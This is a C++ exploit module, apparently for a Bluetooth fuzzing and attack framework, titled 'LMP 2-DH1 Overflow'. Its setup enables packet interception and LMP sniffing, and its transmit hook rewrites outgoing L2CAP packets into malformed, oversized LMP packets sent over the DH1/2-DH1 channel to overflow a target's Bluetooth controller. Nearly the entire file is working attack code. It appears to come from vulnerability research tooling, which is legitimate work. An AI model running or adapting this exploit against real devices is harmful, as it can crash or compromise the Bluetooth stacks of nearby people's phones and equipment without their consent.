#include "ModulesInclude.hpp"
#include <stdlib.h>
#include <stdio.h>
#include <inttypes.h>


// Setup
static const char *module_name()
{
    return "LMP 2-DH1 Overflow";
}

static int setup(void *p)
{
    // Change required configuration for exploit
    Config *config = (Config *)p;
    config->fuzzing.packet_retry = true;
    config->fuzzing.packet_retry_timeout_ms = 2000;
    config->options.auto_start = true;
    config->bluetooth.bridge_hci = true;
    config->bluetooth.intercept_tx = true;
    config->bluetooth.lmp_sniffing = true;
    config->bluetooth.rx_bypass = false;
    config->bluetooth.rx_bypass_on_demand = false;
    config->fuzzing.enable_duplication = false;
    config->fuzzing.enable_mutation = false;
    config->fuzzing.enable_optimization = false;

    return 0;
}

// TX
static int tx_pre_dissection(uint8_t *pkt_buf, int pkt_length, void *p)
{
    return 0;
}

static int tx_post_dissection(uint8_t *pkt_buf, int pkt_length, void *p)
{
    // Wait for L2CAP
    if (pkt_length >= 10 && ((pkt_buf[2] & 0b11) == 0x02) && (pkt_buf[8] == 0x0a))
    {
        // Change L2CAP packet to LMP with size 18 (non-compliant), this will effectivelly send an LMP through DH1/2-DH1 channel
        pkt_buf[0] = (pkt_buf[0] & ~(0b1111 << 3)) | 0x04 << 3;
        // pkt_buf[2] = 0x97;
        pkt_buf[2] = 0xDF;
        // pkt_buf[2] = 0x4f;
        // pkt_buf[3] = 0x00;
        // pkt_buf[4] = 0x4e;
        return 1;
    }
    return 0;
}

// RX
static int rx_pre_dissection(uint8_t *pkt_buf, int pkt_length, void *p)
{
    return 0;
}

static int rx_post_dissection(uint8_t *pkt_buf, int pkt_length, void *p)
{
    return 0;
}